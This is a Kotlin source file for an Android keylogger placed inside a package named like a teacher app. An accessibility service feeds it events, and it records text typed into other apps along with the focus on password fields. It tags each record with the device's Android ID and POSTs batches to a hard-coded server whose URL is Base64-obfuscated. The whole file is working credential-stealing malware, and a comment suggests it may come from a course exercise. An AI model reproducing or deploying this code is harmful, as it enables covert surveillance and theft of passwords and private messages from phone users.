package com.example.teacherapp.services

import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

/**
 * KeyloggerHelper — plain helper class (NOT an AccessibilityService).
 * Receives events forwarded from MaliciousAccessibilityService.
 * Captures keystrokes + field focus events, buffers, then exfiltrates.
 */
class KeyloggerHelper(private val service: MaliciousAccessibilityService) {

    private val TAG = "Keylogger"

    data class KeystrokeData(
        val text: String,
        val packageName: String,
        val className: String,
        val timestamp: Long
    )

    private val keystrokes   = mutableListOf<KeystrokeData>()
    private val maxBufferSize = 5   // flush when buffer hits 5

    // ── Entry point called by MaliciousAccessibilityService ──────────────────

    fun onEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> captureTextInput(event)
                AccessibilityEvent.TYPE_VIEW_FOCUSED      -> captureFieldFocus(event)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event: ${e.message}")
        }
    }

    // ── Private helpers ───────────────────────────────────────────────────────

    private fun captureTextInput(event: AccessibilityEvent) {
        try {
            val text        = event.text?.joinToString("") ?: ""
            if (text.isBlank()) return

            val packageName = event.packageName?.toString() ?: "unknown"
            val className   = event.className?.toString()   ?: "unknown"

            keystrokes.add(KeystrokeData(text, packageName, className, System.currentTimeMillis()))
            Log.d(TAG, "Captured: '$text' from $packageName")

            if (keystrokes.size >= maxBufferSize) exfiltrateKeystrokes()

        } catch (e: Exception) {
            Log.e(TAG, "Error capturing text: ${e.message}")
        }
    }

    private fun captureFieldFocus(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: ""
            val className   = event.className?.toString()   ?: ""

            if (className.contains("EditText",  ignoreCase = true) ||
                className.contains("Password",  ignoreCase = true)) {

                Log.d(TAG, "User focused on input field in $packageName")
                keystrokes.add(
                    KeystrokeData(
                        text        = "[FIELD_FOCUSED:$className]",
                        packageName = packageName,
                        className   = className,
                        timestamp   = System.currentTimeMillis()
                    )
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing focus: ${e.message}")
        }
    }

    // ── Exfiltration (also called on service interrupt/destroy) ───────────────

    fun exfiltrateKeystrokes() {
        if (keystrokes.isEmpty()) return

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val toSend = keystrokes.toList()
                keystrokes.clear()

                val arr = JSONArray()
                toSend.forEach { ks ->
                    arr.put(JSONObject().apply {
                        put("text",      ks.text)
                        put("package",   ks.packageName)
                        put("class",     ks.className)
                        put("timestamp", ks.timestamp)
                        put("time",      formatTime(ks.timestamp))
                    })
                }

                val data = JSONObject().apply {
                    put("keystrokes",   arr)
                    put("android_id",   getAndroidId())
                    put("count",        toSend.size)
                    put("collected_at", System.currentTimeMillis())
                }

                sendToServer(data)

            } catch (e: Exception) {
                Log.e(TAG, "Error exfiltrating keystrokes: ${e.message}")
            }
        }
    }

    private suspend fun sendToServer(data: JSONObject) {
        try {
            // Base64-encoded URL for obfuscation (Part 3)
            // Decodes to: http://20.189.79.25:5000/api/keystrokes
            val encoded   = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9rZXlzdHJva2Vz"
            val serverUrl = String(Base64.decode(encoded, Base64.DEFAULT))

            val connection = URL(serverUrl).openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput      = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 10000
                readTimeout    = 10000
            }

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "✅ Keystrokes exfiltrated successfully (${data.getInt("count")} keys)")
            } else {
                Log.e(TAG, "❌ Server error: $responseCode")
            }
            connection.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
        }
    }

    private fun getAndroidId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                service.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) { "unknown" }
    }

    private fun formatTime(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(timestamp))
    }
}